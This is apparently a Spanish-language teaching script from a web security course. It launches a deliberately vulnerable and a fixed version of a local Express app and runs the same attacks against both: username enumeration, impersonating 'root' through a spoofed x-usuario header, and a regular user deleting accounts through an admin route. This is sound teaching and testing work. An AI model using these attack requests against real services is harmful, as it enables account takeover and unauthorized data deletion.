// Módulo 20 · F125 · El ataque: enumerar usuarios, suplantar con una cabecera y borrar como si fueras admin.
// Arranca las dos versiones y les envía lo mismo. Ejecuta: node f125-passport/ataque.js
import { once } from 'node:events';
import { randomBytes } from 'node:crypto';
import { crearApp as crearAntes } from './antes.js';
import { crearApp as crearDespues } from './despues.js';

async function atacar(nombre, app) {
  const servidor = app.listen(0);
  await once(servidor, 'listening');
  const base = `http://127.0.0.1:${servidor.address().port}`;
  const pedir = async (metodo, ruta, { cabeceras = {}, cuerpo } = {}) => {
    const r = await fetch(`${base}${ruta}`, { method: metodo, headers: { 'content-type': 'application/json', ...cabeceras }, body: cuerpo && JSON.stringify(cuerpo) });
    const texto = await r.text();
    return `${r.status} ${texto.replace(/"token":"[^"]+"/, '"token":"<jwt>"')}`;
  };
  console.log(`== ${nombre}`);
  console.log(`   login usuario inexistente        -> ${await pedir('POST', '/login', { cuerpo: { usuario: 'zzz', clave: 'x' } })}`);
  console.log(`   login usuario real, clave mala   -> ${await pedir('POST', '/login', { cuerpo: { usuario: 'root', clave: 'x' } })}`);
  console.log(`   x-usuario: root (sin clave)      -> ${await pedir('GET', '/mis-pedidos', { cabeceras: { 'x-usuario': 'root' } })}`);
  const login = await fetch(`${base}/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ usuario: 'ana', clave: 'ana123' }) }).then((r) => r.json());
  const comoAna = login.token ? { authorization: `Bearer ${login.token}` } : { 'x-usuario': 'ana' };
  console.log(`   Ana (cliente) borra un usuario   -> ${await pedir('DELETE', '/admin/usuarios/u2', { cabeceras: comoAna })}`);
  servidor.close();
}
await atacar('ANTES (vulnerable)', crearAntes());
await atacar('DESPUÉS (seguro)', crearDespues({ secreto: randomBytes(32).toString('hex') }));
